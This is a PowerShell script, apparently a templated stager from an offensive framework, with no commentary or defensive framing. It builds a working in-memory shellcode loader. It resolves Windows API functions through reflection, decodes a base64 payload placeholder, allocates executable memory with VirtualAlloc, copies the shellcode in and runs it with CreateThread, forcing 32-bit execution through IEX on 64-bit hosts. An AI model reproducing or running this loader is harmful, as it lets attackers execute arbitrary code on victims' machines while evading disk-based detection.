Set-StrictMode -Version 2

$VAR1 = @'
function VAR2 {
        Param ($VAR_module, $VAR_procedure)
        $VAR3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $VAR3.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($VAR3.GetMethod('GetModuleHandle')).Invoke($null, @($VAR_module)))), $VAR_procedure))
}

function VAR4 {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $VAR7,
                [Parameter(Position = 1)] [Type] $VAR5 = [Void]
        )

        $VAR6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $VAR6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $VAR7).SetImplementationFlags('Runtime, Managed')
        $VAR6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $VAR5, $VAR7).SetImplementationFlags('Runtime, Managed')
        return $VAR6.CreateType()
}

[Byte[]]$VAR8 = [Convert]::FromBase64String("[PAYLOAD]")

$VAR9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((VAR2 kernel32.dll VirtualAlloc), (VAR4 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $VAR8.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($VAR8, 0, $VAR9, $VAR8.length)

$VAR10 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((VAR2 kernel32.dll CreateThread), (VAR4 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$VAR9,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((VAR2 kernel32.dll WaitForSingleObject), (VAR4 @([IntPtr], [Int32]))).Invoke($VAR10,0x0) | Out-Null
'@

If ([IntPtr]::size -eq 8) {
        Start-Job { param($VAR11) IEX $VAR11 } -RunAs32 -Argument $VAR1 | Wait-Job | Receive-Job
}
else {
        IEX $VAR1
}
